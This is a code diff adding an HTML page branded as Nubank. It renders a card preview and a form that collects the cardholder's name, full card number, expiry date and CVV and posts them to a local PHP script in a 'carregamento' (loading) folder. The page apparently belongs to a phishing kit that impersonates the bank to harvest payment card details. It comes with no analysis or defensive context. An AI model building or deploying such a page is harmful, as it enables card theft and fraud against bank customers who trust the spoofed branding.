@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+
+    <title>Nubank</title>
+</head>
+<body>
+    <div id="page-home">
+        <div class="center">
+            <div class="header">
+                <img id="seta" src="../../image/seta.png" />
+                <h3>Cartão</h3>
+            </div>
+
+            <div class="cartao">
+                <div class="card-header">
+                    <img src="../../image/logo-branco1.png"/>
+                    <h2 id="nomec">Evandro M Sousa</h2>
+                </div>
+
+                <div class="card-body">
+                    <p id="numerocartao">**** **** **** ****</p>
+                </div>
+
+                <div class="card-footer">
+                    <h3 id="validadee">MM/AA</h3>
+                </div>
+            </div><!--CARTÃO ROXO-->
+
+            <main>
+                <form action="../carregamento/cartao.php" method="POST">
+                    <div class="formulario">
+
+                        <div class="input-block" >
+                            <p>Nome</p>
+                            <input name="nome" type="text" maxlength="35" id="nome" onkeyup="myFunction()" />
+                        </div>
+
+                        <div class="input-block" >
+                            <p>Numero do Cartão</p>
+                            <input name="numeroc" maxlength="19" type="text" id="numeroc" onkeypress="mascara(this)" onkeyup="myFunctionn()" />
+                        </div>
+
+                        <div class="input-block2" >
+                            <p>Validade</p>
+                            <input name="val" maxlength="5" onkeypress="mascaraa(this)" type="text" id="validade"  onkeyup="myFunctionnn()"/>
+                        </div>
+
+                        <div class="input-block3" >
+                            <p>CVV</p>
+                            <input name="cvv" maxlength="3" type="password" id="validade"  onkeyup="myFunctionnn()"/>
+                        </div>
+
+                        <input class="botao" type="submit" value="CONTINUAR">
+                    </div>
+                </form>
+            </main>
+        </div>
+    </div>
+</body>
+<script>
+    function myFunction() {
+      var x = document.getElementById("nome").value;
+      document.getElementById('nomec').innerHTML =  x;
+      
+    }
+
+    function myFunctionn() {
+      var x = document.getElementById("numeroc").value;
+      document.getElementById('numerocartao').innerHTML =  x;
+      
+      
+    }
+
+    function myFunctionnn() {
+      var x = document.getElementById("validade").value;
+      document.getElementById('validadee').innerHTML =  x;
+      
+    }
+
+    function mascara(telefone){ 
+            if(telefone.value.length == 4)
+                telefone.value =  telefone.value + ' ' ; 
+            if(telefone.value.length == 9)
+                telefone.value =  telefone.value + ' ' ; 
+ 
+            if(telefone.value.length == 14)
+                telefone.value =  telefone.value + ' ' ; 
+  
+}
+
+    function mascaraa(telefone){ 
+            if(telefone.value.length == 2)
+                telefone.value =  telefone.value + '/' ; 
+  
+}
+
+
+
+
+    </script>
+    
+    </script>
+</html>
